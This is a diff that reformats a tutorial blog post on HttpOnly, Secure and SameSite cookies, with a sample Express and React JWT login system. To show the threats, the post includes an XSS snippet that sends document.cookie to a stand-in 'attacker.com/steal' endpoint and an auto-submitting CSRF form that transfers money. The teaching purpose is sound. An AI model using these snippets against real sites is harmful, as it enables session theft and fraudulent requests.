@@ -1,5 +1,4 @@
 ---
-
 title: "HttpOnly, Secure, and SameSite Cookies Explained with Real Auth Example"
 author: "Nihesh Rachakonda"
 date: "2026-01-06"
@@ -28,9 +27,9 @@ The httpOnly attribute prevents client-side JavaScript from accessing cookies th
 ```javascript
 // Attacker's malicious script injected via XSS
 const stolenToken = document.cookie;
-fetch('https://attacker.com/steal', {
-  method: 'POST',
-  body: JSON.stringify({ token: stolenToken })
+fetch("https://attacker.com/steal", {
+  method: "POST",
+  body: JSON.stringify({ token: stolenToken }),
 });
 ```
 
@@ -40,9 +39,9 @@ If your authentication cookie lacks httpOnly, an attacker who successfully injec
 
 ```javascript
 // Server-side: Node.js/Express example
-res.cookie('authToken', token, {
-  httpOnly: true,  // JavaScript cannot access this cookie
-  maxAge: 24 * 60 * 60 * 1000 // 24 hours
+res.cookie("authToken", token, {
+  httpOnly: true, // JavaScript cannot access this cookie
+  maxAge: 24 * 60 * 60 * 1000, // 24 hours
 });
 ```
 
@@ -59,20 +58,20 @@ If a user connects over HTTP (even accidentally), cookies without the secure fla
 ### Implementation
 
 ```javascript
-res.cookie('authToken', token, {
+res.cookie("authToken", token, {
   httpOnly: true,
-  secure: true,  // Only sent over HTTPS
-  maxAge: 24 * 60 * 60 * 1000
+  secure: true, // Only sent over HTTPS
+  maxAge: 24 * 60 * 60 * 1000,
 });
 ```
 
 **Important**: In development, you might use HTTP. Handle this conditionally:
 
 ```javascript
-res.cookie('authToken', token, {
+res.cookie("authToken", token, {
   httpOnly: true,
-  secure: process.env.NODE_ENV === 'production',
-  maxAge: 24 * 60 * 60 * 1000
+  secure: process.env.NODE_ENV === "production",
+  maxAge: 24 * 60 * 60 * 1000,
 });
 ```
 
@@ -92,10 +91,12 @@ Imagine a user is logged into `yourbank.com`. They visit `evil.com`, which conta
 
 ```html
 <form action="https://yourbank.com/transfer" method="POST">
-  <input type="hidden" name="amount" value="10000">
-  <input type="hidden" name="to" value="attacker-account">
+  <input type="hidden" name="amount" value="10000" />
+  <input type="hidden" name="to" value="attacker-account" />
 </form>
-<script>document.forms[0].submit();</script>
+<script>
+  document.forms[0].submit();
+</script>
 ```
 
 Without sameSite protection, the browser automatically includes the authentication cookie with this malicious request.
@@ -103,11 +104,11 @@ Without sameSite protection, the browser automatically includes the authenticati
 ### Protection with SameSite
 
 ```javascript
-res.cookie('authToken', token, {
+res.cookie("authToken", token, {
   httpOnly: true,
   secure: true,
-  sameSite: 'strict',  // Blocks cross-site requests entirely
-  maxAge: 24 * 60 * 60 * 1000
+  sameSite: "strict", // Blocks cross-site requests entirely
+  maxAge: 24 * 60 * 60 * 1000,
 });
 ```
 
@@ -126,10 +127,10 @@ Let’s build a complete authentication system with properly configured cookies.
 ### Backend: Express.js Authentication
 
 ```javascript
-const express = require('express');
-const jwt = require('jsonwebtoken');
-const bcrypt = require('bcrypt');
-const cookieParser = require('cookie-parser');
+const express = require("express");
+const jwt = require("jsonwebtoken");
+const bcrypt = require("bcrypt");
+const cookieParser = require("cookie-parser");
 
 const app = express();
 app.use(express.json());
@@ -139,141 +140,136 @@ const JWT_SECRET = process.env.JWT_SECRET;
 const REFRESH_SECRET = process.env.REFRESH_SECRET;
 
 // Login endpoint
-app.post('/api/auth/login', async (req, res) => {
+app.post("/api/auth/login", async (req, res) => {
   const { email, password } = req.body;
-  
+
   // Validate credentials (simplified)
   const user = await User.findOne({ email });
-  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
-    return res.status(401).json({ error: 'Invalid credentials' });
+  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
+    return res.status(401).json({ error: "Invalid credentials" });
   }
-  
+
   // Generate tokens
   const accessToken = jwt.sign(
     { userId: user.id, email: user.email },
     JWT_SECRET,
-    { expiresIn: '15m' }
+    { expiresIn: "15m" },
   );
-  
-  const refreshToken = jwt.sign(
-    { userId: user.id },
-    REFRESH_SECRET,
-    { expiresIn: '7d' }
-  );
-  
+
+  const refreshToken = jwt.sign({ userId: user.id }, REFRESH_SECRET, {
+    expiresIn: "7d",
+  });
+
   // Set secure cookies
-  res.cookie('accessToken', accessToken, {
+  res.cookie("accessToken", accessToken, {
     httpOnly: true,
-    secure: process.env.NODE_ENV === 'production',
-    sameSite: 'strict',
-    maxAge: 15 * 60 * 1000 // 15 minutes
+    secure: process.env.NODE_ENV === "production",
+    sameSite: "strict",
+    maxAge: 15 * 60 * 1000, // 15 minutes
   });
-  
-  res.cookie('refreshToken', refreshToken, {
+
+  res.cookie("refreshToken", refreshToken, {
     httpOnly: true,
-    secure: process.env.NODE_ENV === 'production',
-    sameSite: 'strict',
-    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
+    secure: process.env.NODE_ENV === "production",
+    sameSite: "strict",
+    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
   });
-  
-  res.json({ 
+
+  res.json({
     success: true,
-    user: { id: user.id, email: user.email }
+    user: { id: user.id, email: user.email },
   });
 });
 
 // Protected route middleware
 const authenticate = (req, res, next) => {
   const token = req.cookies.accessToken;
-  
+
   if (!token) {
-    return res.status(401).json({ error: 'Not authenticated' });
+    return res.status(401).json({ error: "Not authenticated" });
   }
-  
+
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
     req.user = decoded;
     next();
   } catch (error) {
-    return res.status(401).json({ error: 'Invalid token' });
+    return res.status(401).json({ error: "Invalid token" });
   }
 };
 
 // Token refresh endpoint
-app.post('/api/auth/refresh', async (req, res) => {
+app.post("/api/auth/refresh", async (req, res) => {
   const refreshToken = req.cookies.refreshToken;
-  
+
   if (!refreshToken) {
-    return res.status(401).json({ error: 'No refresh token' });
+    return res.status(401).json({ error: "No refresh token" });
   }
-  
+
   try {
     const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
-    
+
     // Generate new access token
-    const newAccessToken = jwt.sign(
-      { userId: decoded.userId },
-      JWT_SECRET,
-      { expiresIn: '15m' }
-    );
-    
-    res.cookie('accessToken', newAccessToken, {
-      httpOnly: true,
-      secure: process.env.NODE_ENV === 'production',
-      sameSite: 'strict',
-      maxAge: 15 * 60 * 1000
+    const newAccessToken = jwt.sign({ userId: decoded.userId }, JWT_SECRET, {
+      expiresIn: "15m",
     });
-    
+
+    res.cookie("accessToken", newAccessToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: "strict",
+      maxAge: 15 * 60 * 1000,
+    });
+
     res.json({ success: true });
   } catch (error) {
-    return res.status(401).json({ error: 'Invalid refresh token' });
+    return res.status(401).json({ error: "Invalid refresh token" });
   }
 });
 
 // Logout endpoint
-app.post('/api/auth/logout', (req, res) => {
-  res.clearCookie('accessToken');
-  res.clearCookie('refreshToken');
+app.post("/api/auth/logout", (req, res) => {
+  res.clearCookie("accessToken");
+  res.clearCookie("refreshToken");
   res.json({ success: true });
 });
 
 // Protected route example
-app.get('/api/user/profile', authenticate, (req, res) => {
+app.get("/api/user/profile", authenticate, (req, res) => {
   res.json({ user: req.user });
 });
 
-app.listen(3000, () => console.log('Server running on port 3000'));
+app.listen(3000, () => console.log("Server running on port 3000"));
 ```
 
 ### Frontend: React Authentication
 
 ```javascript
-import { useState } from 'react';
+import { useState } from "react";
 
 function LoginForm() {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [error, setError] = useState('');
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [error, setError] = useState("");
 
   const handleLogin = async (e) => {
     e.preventDefault();
-    
+
     try {
-      const response = await fetch('http://localhost:3000/api/auth/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        credentials: 'include', // Important: sends cookies
-        body: JSON.stringify({ email, password })
+      const response = await fetch("http://localhost:3000/api/auth/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        credentials: "include", // Important: sends cookies
+        body: JSON.stringify({ email, password }),
       });
-      
+
       if (!response.ok) {
-        throw new Error('Login failed');
+        throw new Error("Login failed");
       }
-      
+
       const data = await response.json();
-      console.log('Logged in successfully:', data.user);
+      console.log("Logged in successfully:", data.user);
       // Redirect to dashboard
-      
     } catch (err) {
       setError(err.message);
     }
@@ -305,43 +301,46 @@ function LoginForm() {
 async function authenticatedFetch(url, options = {}) {
   const response = await fetch(url, {
     ...options,
-    credentials: 'include'
+    credentials: "include",
   });
-  
+
   if (response.status === 401) {
     // Try to refresh token
-    const refreshResponse = await fetch('http://localhost:3000/api/auth/refresh', {
-      method: 'POST',
-      credentials: 'include'
-    });
-    
+    const refreshResponse = await fetch(
+      "http://localhost:3000/api/auth/refresh",
+      {
+        method: "POST",
+        credentials: "include",
+      },
+    );
+
     if (refreshResponse.ok) {
       // Retry original request
       return fetch(url, {
         ...options,
-        credentials: 'include'
+        credentials: "include",
       });
     }
-    
+
     // Refresh failed, redirect to login
-    window.location.href = '/login';
-    throw new Error('Authentication failed');
+    window.location.href = "/login";
+    throw new Error("Authentication failed");
   }
-  
+
   return response;
 }
 
 // Usage example
 function UserProfile() {
   const [profile, setProfile] = useState(null);
-  
+
   useEffect(() => {
-    authenticatedFetch('http://localhost:3000/api/user/profile')
-      .then(res => res.json())
-      .then(data => setProfile(data.user))
-      .catch(err => console.error(err));
+    authenticatedFetch("http://localhost:3000/api/user/profile")
+      .then((res) => res.json())
+      .then((data) => setProfile(data.user))
+      .catch((err) => console.error(err));
   }, []);
-  
+
   return profile ? <div>Welcome, {profile.email}</div> : <div>Loading...</div>;
 }
 ```
@@ -351,12 +350,14 @@ function UserProfile() {
 When using cookies with a separate frontend and backend, configure CORS properly:
 
 ```javascript
-const cors = require('cors');
+const cors = require("cors");
 
-app.use(cors({
-  origin: 'http://localhost:5173', // Your frontend URL
-  credentials: true // Allow cookies
-}));
+app.use(
+  cors({
+    origin: "http://localhost:5173", // Your frontend URL
+    credentials: true, // Allow cookies
+  }),
+);
 ```
 
 ## Common Pitfalls and Solutions
